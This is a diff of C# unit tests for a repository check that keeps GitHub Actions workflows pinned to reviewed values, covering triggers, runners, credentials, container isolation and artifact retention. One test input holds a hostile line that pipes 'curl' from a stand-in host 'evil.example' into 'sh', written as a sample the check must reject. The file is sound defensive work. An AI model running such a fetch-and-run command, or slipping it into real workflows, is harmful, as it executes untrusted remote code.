@@ -59,7 +59,7 @@ public sealed class RepositoryCheckTests
     [InlineData("ci.yml", "    env:\n      CI: true\n", "    env: {CI: true}\n", "flow mappings are unsupported")]
     [InlineData("ci.yml", "    steps:\n", "    steps: [uses: evil/action@main, run: curl -sL https://evil.example/p | sh]\n", "flow sequences are unsupported")]
     [InlineData("ci.yml", "      - run: dotnet tool restore\n", "      - {uses: unknown/action@main}\n", "flow mappings are unsupported")]
-    [InlineData("native-chdman.yml", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions: {contents: write}\n", "flow mappings are unsupported")]
+    [InlineData("release.yml", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions: {contents: write}\n", "flow mappings are unsupported")]
     public void UnsupportedYamlFormsCannotBypassReview(string workflow, string original, string replacement, string message)
     {
         using var directory = Copy();
@@ -92,7 +92,7 @@ public sealed class RepositoryCheckTests
         {
             using var directory = Copy();
             string original = hidden.Contains("with:", StringComparison.Ordinal) ? "        with:\n          persist-credentials: false\n" : "    timeout-minutes: 10\n";
-            Replace(directory, "native-chdman.yml", original, hidden);
+            Replace(directory, "release.yml", original, hidden);
             Assert.Contains("only LF-terminated printable ASCII", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
         }
     }
@@ -105,20 +105,20 @@ public sealed class RepositoryCheckTests
     {
         using var directory = Copy();
         const string run = "      - run: dotnet restore Moonlark.Native.slnx --locked-mode\n";
-        Replace(directory, "native-chdman.yml", run, run + continuation);
+        Replace(directory, "release.yml", run, run + continuation);
         Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
     /// <summary>Triggers, runners, checkout options and other values are exact reviewed values.</summary>
     [Theory]
-    [InlineData("native-chdman.yml", "on:\n  workflow_dispatch:\n", "on: [workflow_dispatch, pull_request_target, workflow_run]\n", "flow sequences are unsupported")]
-    [InlineData("native-chdman.yml", "on:\n", "on: workflow_run\n", "on must be a block mapping")]
-    [InlineData("native-chdman.yml", "runs-on: ubuntu-24.04", "runs-on: self-hosted", "unreviewed value for runs-on")]
-    [InlineData("native-chdman.yml", "persist-credentials: false", "persist-credentials: true", "unreviewed value for persist-credentials")]
+    [InlineData("release.yml", "on:\n  workflow_dispatch:\n", "on: [workflow_dispatch, pull_request_target, workflow_run]\n", "flow sequences are unsupported")]
+    [InlineData("release.yml", "on:\n", "on: workflow_run\n", "on must be a block mapping")]
+    [InlineData("release.yml", "runs-on: ubuntu-24.04", "runs-on: self-hosted", "unreviewed value for runs-on")]
+    [InlineData("release.yml", "persist-credentials: false", "persist-credentials: true", "unreviewed value for persist-credentials")]
     [InlineData("ci.yml", "submodules: true", "submodules: recursive", "unreviewed value for submodules")]
     [InlineData("ci.yml", "fetch-depth: 0", "fetch-depth: 1", "unreviewed value for fetch-depth")]
     [InlineData("ci.yml", "    branches: [main]", "    branches: [main, release]", "flow sequences are unsupported")]
-    [InlineData("native-chdman.yml", "timeout-minutes: 10", "timeout-minutes: 600", "unreviewed value for timeout-minutes")]
+    [InlineData("release.yml", "timeout-minutes: 10", "timeout-minutes: 600", "unreviewed value for timeout-minutes")]
     public void ValuesAreExactReviewedValues(string workflow, string original, string replacement, string message)
     {
         using var directory = Copy();
@@ -145,7 +145,7 @@ public sealed class RepositoryCheckTests
     public void PublishingCommandVariantsAreRejected(string line)
     {
         using var directory = Copy();
-        Replace(directory, "native-chdman.yml", "name: Chdman source preflight", line);
+        Replace(directory, "release.yml", "name: Release source preflight", line);
         Assert.Contains("publishing commands require approval", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
@@ -203,6 +203,49 @@ public sealed class RepositoryCheckTests
         using var directory = Copy();
         Replace(directory, "ci.yml", original, original + replacement);
         Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>Opt-in production remains behind the unchanged source preflight and never publishes.</summary>
+    [Fact]
+    public void ChdmanCandidateIsManualAndOptIn()
+    {
+        string text = File.ReadAllText(Path.Combine(TestRepository.Root, ".github/workflows/native-chdman.yml"));
+        Assert.Contains("  workflow_dispatch:\n    inputs:\n      build_linux_x64:", text, StringComparison.Ordinal);
+        Assert.Contains("        type: boolean\n        default: false\n", text, StringComparison.Ordinal);
+        Assert.Contains("    needs: source\n    if: github.repository == 'MoonlarkStudios/romd-native' && github.event_name == 'workflow_dispatch' && inputs.build_linux_x64\n", text, StringComparison.Ordinal);
+        Assert.Contains("--jobs 1 --sdl-include /inputs/sdl/include", text, StringComparison.Ordinal);
+        Assert.Contains("          name: chdman-linux-x64-unqualified-${{ github.run_id }}-${{ github.run_attempt }}", text, StringComparison.Ordinal);
+        Assert.DoesNotContain("  pull_request:", text, StringComparison.Ordinal);
+        Assert.DoesNotContain("  push:", text, StringComparison.Ordinal);
+        Assert.DoesNotContain("attest-build-provenance", text, StringComparison.Ordinal);
+        Assert.Null(RepositoryCheck.Run(TestRepository.Root, null));
+    }
+
+    /// <summary>The exact candidate review rejects independent opt-in, recipe, containment and publication drift.</summary>
+    [Theory]
+    [InlineData("        default: false", "        default: true")]
+    [InlineData(" && inputs.build_linux_x64", "")]
+    [InlineData("    needs: source\n", "")]
+    [InlineData("    runs-on: ubuntu-24.04\n    timeout-minutes: 75", "    runs-on: ubuntu-24.04-arm\n    timeout-minutes: 75")]
+    [InlineData("  contents: read", "  contents: write")]
+    [InlineData("persist-credentials: false", "persist-credentials: true")]
+    [InlineData("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "actions/upload-artifact@main")]
+    [InlineData("          retention-days: 7", "          retention-days: 90")]
+    [InlineData("--network none", "--network host")]
+    [InlineData("--cap-drop ALL", "--cap-add ALL")]
+    [InlineData("--jobs 1", "--jobs 4")]
+    [InlineData(" --sdl-include /inputs/sdl/include", "")]
+    [InlineData("5f5993c530f084535c65a6879e9b26ad441169b3e25d789d83287040a9ca5165", "1f5993c530f084535c65a6879e9b26ad441169b3e25d789d83287040a9ca5165")]
+    [InlineData(".Config.Labels[\"moonlark.chdman.owner\"] == $token", ".Config.Labels[\"moonlark.chdman.owner\"] != $token")]
+    [InlineData("docker rm \"$cid\"", "docker rm --force \"$cid\"")]
+    [InlineData("--mount \"type=bind,source=$p/outputs,target=/repo/artifacts/chdman-ci/outputs\"", "--mount \"type=bind,source=$GITHUB_WORKSPACE/artifacts,target=/repo/artifacts\"")]
+    [InlineData(" || receipt=$?", "")]
+    public void ChdmanCandidateDriftRequiresReview(string original, string replacement)
+    {
+        using var directory = Copy();
+        Replace(directory, "native-chdman.yml", original, replacement);
+        Assert.Contains("native-chdman.yml differs from the reviewed manual candidate workflow",
+            RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
     private static TemporaryDirectory Copy()
